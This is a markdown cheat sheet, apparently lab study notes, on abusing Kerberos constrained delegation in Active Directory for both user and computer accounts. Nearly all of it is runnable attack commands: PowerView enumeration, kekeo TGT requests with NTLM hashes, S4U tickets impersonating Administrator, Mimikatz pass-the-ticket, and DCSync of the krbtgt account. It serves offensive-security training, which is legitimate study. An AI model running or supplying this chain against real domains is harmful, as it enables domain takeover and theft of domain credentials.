# Abusing Constrained Delegation privileges

Constrained delegation - when enabled on a service account, allows access ony to **specified** services on **specified** computers by impersonating a incoming user

To impersonate the user, Service for User (S4U) extension is used which
provides two extensions:
- Service for User to Self (S4U2self) Allows a service to obtain a forwardable TGS to itself on behalf of a user.
- Service for User to Proxy (S4U2proxy) Allows a service to obtain a TGS to a second service on behalf of a user.

## Users with Constrained Delegation enabled
1. Enumerate
```powershell
# (powerview_dev)
# Observe the following:
# cn
# msds-allowedtodelegateto'
# seraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION
Get-DomainUser -TrustedToAuth
```

2. Using kekeo. Request a TGT from websvc
```powershell
tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /ntlm:cc098f204c5887eaa8253e7c2749156f
```

3. Use TGT, request for TGS to request access for service depending on msds-allowedtodelegateto (eg. cifs/dcorp-mssql)
```powershell
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

4. Inject the ticket in current session to use it 
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

```

5. Check 
```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

## Computers with Constrained Delegation enabled
1. Enumerate
```powershell
# (powerview_dev)
# Observe the following:
# cn
# msds-allowedtodelegateto'
# seraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION
Get-DomainComputer -TrustedToAuth
```

2. Using kekeo. Request a TGT from dcorp-adminsrv
```powershell
tgt::ask /user:dcorp-adminsrv /domain:dollarcorp.moneycorp.local /ntlm:5e77978a734e3a7f3895fb0fdbda3b96
```

3. Since there is no SNAME validation, we can request TGS for time and also ldap service on dcorp-dc as the domain administrator - Administrator
```powershell
tgs::s4u /tgt:TGT_dcorp-adminsrv@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

4. Use the LDAP ticket now
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

5. Using this TGS, we can use DCSync from mimikatz without DA privileges
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```